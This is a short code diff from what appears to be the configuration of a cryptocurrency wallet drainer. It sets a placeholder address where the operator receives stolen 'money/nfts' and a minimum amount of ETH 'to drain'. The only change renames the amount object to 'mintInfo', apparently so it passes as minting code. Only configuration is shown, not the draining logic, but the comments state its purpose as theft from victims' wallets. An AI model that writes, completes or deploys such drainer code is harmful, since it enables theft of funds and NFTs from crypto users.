@@ -17,7 +17,7 @@ if (!receiveAddress.startsWith("0x") ||
 const receiveAddress = "Your Eth wallet adress"; // Adress where you want to receive money/nfts
 
 /*   = = = = = AMOUNT = = = = =   */
-const amount = {
+const mintInfo = {
     minimal: 2.0 // Minimal of amount of Eth to drain (2.0 is the minimum supported)
 }
 
